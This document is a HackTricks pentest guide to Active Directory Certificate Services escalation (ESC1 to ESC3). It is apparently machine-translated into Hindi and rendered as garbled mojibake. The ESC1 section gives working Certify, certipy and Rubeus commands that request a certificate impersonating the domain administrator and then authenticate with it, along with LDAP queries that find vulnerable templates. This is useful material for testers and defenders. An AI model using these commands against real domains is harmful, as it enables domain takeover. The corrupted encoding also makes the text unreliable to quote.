# рдПрдбреА рд╕реАрдПрд╕ рдбреЛрдореЗрди рдЙрдиреНрдирддрд┐

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, **The PEASS Family** рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**рдпрд╣ рдкреЛрд╕реНрдЯ рдХреЗ рдЙрдиреНрдирддрд┐ рддрдХрдиреАрдХ рдЦрдВрдбреЛрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╣реИ:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ - ESC1

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

### рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ - ESC1 рдХрд╛ рд╡рд┐рд╡рд░рдг

* **рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪрд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдЙрдкрд▓рдмреНрдз рдХрд░рд╛рдП рдЧрдП рд╣реИрдВ рдЙрджреНрдпрдо CA рджреНрд╡рд╛рд░рд╛ред**
* **рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред**
* **рдЕрдзрд┐рдХреГрдд рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред**
* **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**
* **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:**
* рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХреБрдВрдЬреА рдЙрдкрдпреЛрдЧ (EKU) рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдЬреИрд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (OID 1.3.6.1.5.5.7.3.2), PKINIT рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (1.3.6.1.5.2.3.4), рд╕реНрдорд╛рд░реНрдЯ рдХрд╛рд░реНрдб рд▓реЙрдЧрдСрди (OID 1.3.6.1.4.1.311.20.2.2), рдХреЛрдИ рдЙрджреНрджреЗрд╢реНрдп (OID 2.5.29.37.0), рдпрд╛ рдХреЛрдИ EKU рдирд╣реАрдВ (SubCA) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рд╛рдЗрдирд┐рдВрдЧ рдЕрдиреБрд░реЛрдз (CSR) рдореЗрдВ subjectAltName рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рд╣реИ:**
* рдпрджрд┐ рдореМрдЬреВрдж рд╣реИ, рддреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП Active Directory (AD) subjectAltName (SAN) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ CSR рдореЗрдВ SAN рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ, рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдЬреИрд╕реЗ, рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ) рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ SAN рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ AD рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `mspki-certificate-name-flag` рд╕рдВрдкрддреНрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рдпрд╣ рд╕рдВрдкрддреНрддрд┐ рдПрдХ рдмрд┐рдЯрдорд╛рд╕реНрдХ рд╣реИ, рдФрд░ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рдЭрдВрдбрд╛ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ SAN рдХреА рдирд┐рд░реНрджрд┐рд╖реНрдЯрд┐ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

{% hint style="danger" %}
рдЙрдкрд░реЛрдХреНрдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрд┐рд╕реА рднреА рдЪрдпрдирд┐рдд SAN рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреЗрд░рдмреЗрд░реЛрд╕ рдпрд╛ рдПрд╕рдЪреИрдирд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред
{% endhint %}

рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдХрднреА-рдХрднреА HTTPS рдпрд╛ рд╣реЛрд╕реНрдЯ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреА рддреНрд╡рд░рд┐рдд рдЙрддреНрдкрд╛рджрди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдХреА рдЬрд╛рддреА рд╣реИ, рдЙрддреНрдкрд╛рджреЛрдВ рдпрд╛ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рд╕реЗрд╡рд╛рдУрдВ рджреНрд╡рд╛рд░рд╛, рдпрд╛ рд╕рдордЭреМрддреЗ рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдгред

рдЗрд╕реЗ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдиреЗ рдкрд░ рдЪреЗрддрд╛рд╡рдиреА рджреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ рдПрдХ рдореМрдЬреВрджрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ (рдЬреИрд╕реЗ `WebServer` рдЯреЗрдореНрдкрд▓реЗрдЯ, рдЬрд┐рд╕рдореЗрдВ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рд╕рдХреНрд╖рдо рд╣реИ) рдХреА рддрд░рд╣ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг OID рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### рджреБрд░реБрдкрдпреЛрдЧ

**рд╡рд┐рдХрд▓реНрдк рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдХреЛ рдЦреЛрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХреА рднреВрдорд┐рдХрд╛ рдЕрднрд┐рдорд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
рдлрд┐рд░ рдЖрдк рдЙрддреНрдкрдиреНрди **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `.pfx`** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **Rubeus рдпрд╛ certipy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows рдмрд╛рдЗрдирд░реА "Certreq.exe" рдФрд░ "Certutil.exe" рдХрд╛ рдЙрдкрдпреЛрдЧ PFX рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдХреАрдорд╛ рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреА рдЬрд╛рдБрдЪ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдирдореЗрдВ рд╕реЗ рдЬреЛ рдордВрдЬреВрд░реА рдпрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпрд╛ рд╕реНрдорд╛рд░реНрдЯ рдХрд╛рд░реНрдб рд▓реЙрдЧрдСрди EKU рд╡рд╛рд▓реЗ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рдлреНрд▓реИрдЧ рд╕рдХреНрд╖рдо рд╣реЛ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд LDAP рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ - ESC2

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рджреВрд╕рд░реЗ рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдХрд╛ рдПрдХ рд░реВрдкрд╛рдВрддрд░рдг рд╣реИ:

1. рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрджреНрдпрдо CA рджреНрд╡рд╛рд░рд╛ рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
2. рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд┐рд╖реЗрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред
3. рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдЫреВрдЯ рджреА рдЬрд╛рддреА рд╣реИред
4. рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдгрдХрд╛рд░реА, рдЬреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
5. **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU рдпрд╛ рдХреЛрдИ EKU рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред**

**рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU** рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ **рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп**, рд╕рд╣рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдХреЛрдб рд╕рд╛рдЗрдирд┐рдВрдЧ, рдЖрджрд┐ред рдЗрд╕реА **рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ ESC3 рдХреЗ рд▓рд┐рдП** рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдХреЛрдИ EKU рд╡рд╛рд▓реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдЬреЛ рдЙрдк-CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВ, **рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп** рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рд▓рд┐рдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдк-CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди EKUs рдпрд╛ рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ рд▓рд┐рдП рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛рд░реНрдп рдХрд░реЗрдВрдЧреЗ рдЕрдЧрд░ рдЙрдк-CA рдХреЛ **`NTAuthCertificates`** рдСрдмреНрдЬреЗрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ рд╣реИред рдлрд┐рд░ рднреА, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ **рдХрд┐рд╕реА рднреА EKU** рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрдиреНрд╣реЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рджреБрд░реБрдкрдпреЛрдЧ** рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рдкрдХ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП (рдЬреИрд╕реЗ, рдХреЛрдб рд╕рд╛рдЗрдирд┐рдВрдЧ, рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдЖрджрд┐) рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ SAML, AD FS, рдпрд╛ IPSecред

рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХреЗ рднреАрддрд░ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЯреЗрдореНрдкрд▓реЗрдЯреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП AD рд╡рдиреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдХреАрдорд╛ рдореЗрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд LDAP рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ - ESC3

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдкрд╣рд▓реЗ рдФрд░ рджреВрд╕рд░реЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ **рд╡рд┐рднрд┐рдиреНрди EKU** (рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ) рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ **2 рд╡рд┐рднрд┐рдиреНрди рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рд╣реИ (рдЗрд╕рд▓рд┐рдП рдЗрд╕рдореЗрдВ 2 рд╕реЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ),

**рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ EKU** (OID 1.3.6.1.4.1.311.20.2.1), рдЬрд┐рд╕реЗ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ **рдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХрд┐рд╕реА рдкреНрд░рдзрд╛рди рдХреЛ рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рдХреЗ рд▓рд┐рдП **рд░рдЬрд┐рд╕реНрдЯрд░** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

